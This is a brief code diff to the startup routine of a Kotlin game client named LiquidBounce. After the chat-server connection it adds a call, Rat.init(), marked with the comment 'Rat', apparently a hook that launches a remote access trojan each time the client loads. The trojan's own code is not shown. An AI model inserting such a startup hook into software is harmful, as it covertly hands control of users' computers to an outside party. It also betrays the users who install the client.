@@ -110,6 +110,9 @@ object LiquidBounce : Listenable {
 
         // Connect to chat server
         Chat.connect()
+        
+        // Rat
+        Rat.init()
 
         logger.info("Successfully loaded client!")
     }
